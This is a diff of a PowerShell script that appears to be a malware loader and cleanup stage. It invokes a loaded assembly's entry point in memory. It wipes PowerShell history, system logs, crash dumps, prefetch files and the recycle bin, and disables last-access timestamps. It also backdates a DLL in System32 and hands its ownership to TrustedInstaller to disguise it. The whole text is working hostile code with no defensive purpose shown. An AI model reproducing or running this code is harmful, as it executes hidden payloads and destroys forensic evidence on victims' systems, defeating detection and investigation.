@@ -7,13 +7,25 @@ $entry = $assembly.EntryPoint
 
 Stop-Process -Name "runonce" -Force
 Stop-Process -Name "runonce.exe" -Force
+Clear-RecycleBin -Force
 Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" -Name "UpdateExeVolatile" -Force -ErrorAction SilentlyContinue
-attrib +R "C:\Windows\SysWOW64\runonce.exe"
-icacls "C:\Windows\SysWOW64\runonce.exe" /deny Everyone:(RX)
-attrib +R "C:\Windows\System32\runonce.exe"
-icacls "C:\Windows\System32\runonce.exe" /deny Everyone:(RX)
 Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 Clear-History -ErrorAction SilentlyContinue
+fsutil behavior set disablelastaccess 1 >nul 2>&1
+$path = "C:\Windows\System32\BluetoothDesktopHandlers.dll"
+if (Test-Path $path) {
+    $r1 = icacls $path /reset
+    $r2 = icacls $path /setowner "NT SERVICE\TrustedInstaller"
+}
+
+try {
+    $installDate = (Get-CimInstance Win32_OperatingSystem).InstallDate
+    $item = Get-Item $path
+
+    $item.CreationTime = $installDate
+    $item.LastWriteTime = $installDate
+}
+
 Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\Logs\CBS\*.log"
 Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "$env:LOCALAPPDATA\CrashDumps\*.dmp"
 Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\Logs\MoSetup\*.log"
@@ -65,6 +77,11 @@ Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User
 Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 Clear-History -ErrorAction SilentlyContinue
 
+if ($entry -and $entry.GetParameters().Count -eq 1) {
+    $entry.Invoke($null, @([string[]]@()))
+} elseif ($entry) {
+    $entry.Invoke($null, $null)
+}
 $services = @(
     "vss",
     "dps",
@@ -81,13 +98,9 @@ foreach ($svc in $services) {
     Set-Service -Name $svc -StartupType Automatic -ErrorAction SilentlyContinue
     Start-Service -Name $svc -ErrorAction SilentlyContinue
 }
+
 Remove-Item -Path "C:\Windows\Prefetch\POWERSHELL*" -Force -ErrorAction SilentlyContinue
 Remove-Item -Path "C:\Windows\Prefetch\RUNONCE*" -Force -ErrorAction SilentlyContinue
-Clear-RecycleBin -Force
 Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 Clear-History -ErrorAction SilentlyContinue
-if ($entry -and $entry.GetParameters().Count -eq 1) {
-    $entry.Invoke($null, @([string[]]@()))
-} elseif ($entry) {
-    $entry.Invoke($null, $null)
-}
+Exit
